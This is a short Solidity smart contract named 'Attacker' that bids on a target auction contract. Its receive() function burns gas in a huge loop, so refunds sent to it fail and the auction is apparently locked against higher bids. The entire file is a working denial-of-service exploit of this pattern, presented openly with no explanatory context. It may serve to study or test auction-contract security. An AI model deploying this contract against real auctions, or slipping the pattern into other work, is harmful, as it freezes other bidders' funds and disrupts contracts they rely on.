// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IAuction {
    function bid() external payable;
}

contract Attacker is ReentrancyGuard {

  function attack(address _auctionContractAddress) external payable nonReentrant {
    IAuction(_auctionContractAddress).bid{value: msg.value}();
  }

  receive() external payable {
     for (uint256 i = 0; i < 10**10; i++) {
         // Some basic arithmetic operations to consume gas
         uint256 x = i + 1;
         uint256 y = x * 2;
         uint256 z = y / 3;
         uint256 w = z - 4;
            
         // Perform additional operations to consume more gas
         w += i;
         z *= w;       
     }
  }
}
